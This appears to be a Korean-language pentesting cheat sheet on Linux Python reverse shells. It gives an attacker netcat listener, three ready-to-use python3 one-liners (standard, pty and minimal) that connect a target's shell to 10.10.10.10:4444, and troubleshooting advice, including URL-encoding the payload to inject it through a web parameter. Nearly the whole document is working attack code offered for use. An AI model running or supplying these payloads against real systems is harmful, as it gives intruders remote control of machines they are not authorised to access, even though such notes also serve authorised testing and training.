# Linux Python 리버스 셸

- python socket으로 리스너에 연결해 os.dup2로 표준 입출력을 소켓에 물리는 리버스 셸 원라이너. pty 버전은 연결 직후부터 TTY가 붙어 별도 안정화가 필요 없다.
- 타깃에 python2·python3 중 하나가 설치돼 있을 때 가장 무난한 선택. pty 버전을 쓰면 TTY 안정화 단계를 건너뛸 수 있다.
- 타깃에 python 존재, 공격자 리스너 사전 실행, 타깃에서 공격자 IP로 TCP 아웃바운드 허용이 필요하다.

## 리스너 준비 (공격자)

```bash
nc -lvnp 4444
```

## 일반 버전 (타깃)

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

- `s.connect(("IP",포트))`의 IP·포트만 바꾼다.
- `os.dup2(s.fileno(),0/1/2)`가 stdin·stdout·stderr을 소켓 fd로 덮어써 subprocess의 입출력이 전부 소켓으로 간다.
- python2에서도 동일하게 동작한다. `python3`가 없으면 `python2 -c '...'` 또는 `python -c '...'`으로 실행한다.

## pty 버전 — 권장

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

- `pty.spawn("/bin/bash")`가 진짜 터미널을 붙여준다. tab 완성·화살표 키·ctrl+c 같은 대화형 동작이 처음부터 된다.
- 일반 버전보다 이 쪽을 우선 시도한다. su·ssh처럼 TTY를 요구하는 명령도 바로 실행된다.

## 짧은 변형 (os.system 없이 실행만)

```bash
python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("10.10.10.10",4444));[s.send(subprocess.check_output(i,shell=True)) for i in [input()]]'
```

- 한 번에 한 명령씩 실행되는 최소형. 대화형이 아니라 확인용으로만 쓴다.

## Windows 타깃이면

- Windows용 python 원라이너는 shells/reverse-shell/windows_powershell_reverse_shell.md와 웹셸 전송 스크립트(shells/reverse-shell/scripts/)를 참고한다. 이 문서는 Linux 대상이다.

## 확인과 전환

```bash
# 타깃에서 python 존재·버전 확인
which python python2 python3
python3 -V
```

- python이 아예 없으면 bash /dev/tcp 버전(bash만 있으면 됨) 또는 perl 버전으로 전환한다.

## 트러블슈팅

- `Address already in use`는 공격자 쪽 리스너 포트 충돌이다. `ss -lntp | grep 4444`로 확인하고 다른 포트를 쓴다.
- 연결은 되는데 입력이 안 되면 dup2가 빠진 변형을 쓴 것이다. fd 0·1·2 세 개를 모두 물린 원본을 다시 쓴다.
- pty 버전에서 환경변수 TERM이 비어 prompt가 깨지면 연결 후 `export TERM=xterm`을 실행한다.
- 원라이너에 작은따옴표가 둘러싸여 있어 웹 파라미터로 넣을 때는 전체를 인코딩해 전송한다. `&`는 쿼리 구분자, `'`는 셸 인용이 먼저 해석된다.
- 셸이 열린 뒤 길이가 긴 명령(psql 접속 등)이 잘리면 일반 버전이라는 뜻이다. pty 버전으로 바꾸거나 shell-upgrade 절차를 따른다.
